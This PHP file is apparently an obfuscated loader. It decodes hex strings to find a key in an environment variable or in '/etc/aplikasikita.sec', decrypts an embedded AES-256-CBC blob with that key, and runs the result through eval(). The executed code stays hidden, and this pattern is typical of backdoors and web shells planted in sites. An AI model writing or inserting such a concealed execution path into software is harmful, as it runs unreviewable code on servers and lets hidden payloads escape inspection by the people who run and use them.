<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('4s/alLcG0hJ0AbL3M3mzfQ==');

$c=base64_decode(

'Jtb5Hxexch0m1q1b8oS1UH3JLXiqT1n1OeYgkIH/eDRsit5Uta7bEVeidP0WroNZVM9Yr4w4xo0n' .
'P3iIzwU9Sg6W2o/kK3z8VEvNx0D9iA0mVALt2w2/b8FGzjIyhJbB2dfr6rG7dMvZ+3q0YgHBM0FC' .
'SQKm/J3ThImSqy5dtjQF93uzef+3fqnhYOBlTwyxchJQT4rIJQNG1pPs7OJfVxSy8Ix4p2ZUVZLh' .
'MN/jb2S1eDp1cDCPVdtXVHo/jVWSUVE3Dd1/TARUy4jG1P0acMN/XaKOu6G+rp1xEWE9EXsBFUyK' .
'rzGjh7K0qzthI/88kpGrUsBNCcxXn5lyZCyDzh345Q8QhTfAy2Lsqt8bqukbQimmWpEvxmdpNTFI' .
'zDdXNo/8SWrLi/AANCqcbndNJNHL3ApSEbdDM2ey9NbFgMu8rBSi0PWrXHAlEnCGL9wrICiae69g' .
'LtIJcjgQHoBlqTtaMPOC/F/R4sSwPnYLsCz1DtDwSBUBtM1nZTpp1TqdkSpxoCG0sZjZajV2PkJE' .
'ytNTxAbDE0EYbUySkd5vdNY='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

